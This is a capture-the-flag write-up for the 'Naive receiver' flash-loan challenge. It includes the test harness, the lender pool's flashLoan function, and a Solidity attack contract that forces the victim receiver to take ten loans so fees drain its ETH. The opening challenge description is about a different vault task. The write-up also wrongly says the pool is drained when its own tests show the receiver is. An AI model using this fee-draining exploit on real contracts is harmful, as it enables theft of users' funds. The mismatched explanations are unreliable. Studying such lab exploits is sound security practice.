## Challenge #2 - Naive receiver
There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.

To pass the challenge, make the vault stop offering flash loans.

You start with 10 DVT tokens in balance.

---

First of all, check the origin test script:

```javascript
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Naive receiver', function () {
    let deployer, user, player;
    let pool, receiver;

    // Pool has 1000 ETH in pool
    const ETHER_IN_POOL = 1000n * 10n ** 18n;

    // Receiver has 10 ETH in receiver
    const ETHER_IN_RECEIVER = 10n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        // Get three person in this test case.
        [deployer, user, player] = await ethers.getSigners();

        // deploy pool contract, attack contract and check variables.
        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
        pool = await LenderPoolFactory.deploy();
        await deployer.sendTransaction({ to: pool.address, value: ETHER_IN_POOL });
        const ETH = await pool.ETH();
        expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await pool.maxFlashLoan(ETH)).to.eq(ETHER_IN_POOL);
        expect(await pool.flashFee(ETH, 0)).to.eq(10n ** 18n);
        receiver = await FlashLoanReceiverFactory.deploy(pool.address);

        // set original balance of pool.
        await deployer.sendTransaction({ to: receiver.address, value: ETHER_IN_RECEIVER });
        await expect(
            receiver.onFlashLoan(deployer.address, ETH, ETHER_IN_RECEIVER, 10n**18n, "0x")
        ).to.be.reverted;
        expect(
            await ethers.provider.getBalance(receiver.address)
        ).to.eq(ETHER_IN_RECEIVER);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // All ETH has been drained from the receiver
        expect(
            await ethers.provider.getBalance(receiver.address)
        ).to.be.equal(0);
        expect(
            await ethers.provider.getBalance(pool.address)
        ).to.be.equal(ETHER_IN_POOL + ETHER_IN_RECEIVER);
    });
});
```

And then check out the flash loan function:

```javascript
function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    if (token != ETH)
        revert UnsupportedCurrency();
    
    uint256 balanceBefore = address(this).balance;

    // Transfer ETH and handle control to receiver
    SafeTransferLib.safeTransferETH(address(receiver), amount);
    if(receiver.onFlashLoan(
        msg.sender,
        ETH,
        amount,
        FIXED_FEE,
        data
    ) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }

    if (address(this).balance < balanceBefore + FIXED_FEE)
        revert RepayFailed();

    return true;
}
```

We can see that the fee per transaction is 1 ETH, so if we can receive 10 times flash loan, we will drain all of the pool balance (10 ETH).

So add a file AttackNaiveReceiver.sol(contracts/attacker-contracts/AttackNaiveReceiver.sol) and paste following codes:
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";


contract AttackNaiveReceiver {
    NaiveReceiverLenderPool pool;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    // set naive receiver pool as pool address.
    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    // call the naive receiver pool to do flash loan 10 times.
    function attack(address victim) public {
        for (int i=0; i < 10; i++ ) {
            pool.flashLoan(IERC3156FlashBorrower(victim), ETH, 1 ether, "");
        }
    }
}
```

Call the deploy attack contracts and call attack funtion in test file: 
```javascript
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    const AttackFactory = await ethers.getContractFactory("AttackNaiveReceiver", player);
    const attackContract = await AttackFactory.deploy(pool.address);
    await attackContract.attack(receiver.address);
});
```

Then we can drain all of the ETH in pool !!